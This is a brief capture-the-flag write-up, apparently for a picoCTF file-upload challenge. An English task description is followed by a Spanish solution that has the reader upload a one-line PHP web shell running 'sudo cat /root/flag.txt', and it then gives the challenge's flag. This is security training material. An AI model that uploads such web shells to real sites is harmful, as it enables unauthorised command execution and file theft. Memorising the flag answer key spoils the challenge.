#### Description

A developer has added profile picture upload functionality to a website. However, the implementation is flawed, and it presents an opportunity for you. Your mission, should you choose to accept it, is to navigate to the provided web page and locate the file upload area. Your ultimate goal is to find the hidden flag located in the `/root` directory.You can access the web application [here](http://standard-pizzas.picoctf.net:63396/)!


# Solución 


````
crear un archivo php que se llame shell.php con lo siguiente: 
<?php echo exec("sudo cat /root/flag.txt");?>

subir ese archivo y cambir la direccion por la direccion de archivo /shell.php

picoCTF{wh47_c4n_u_d0_wPHP_f7424fc7}



```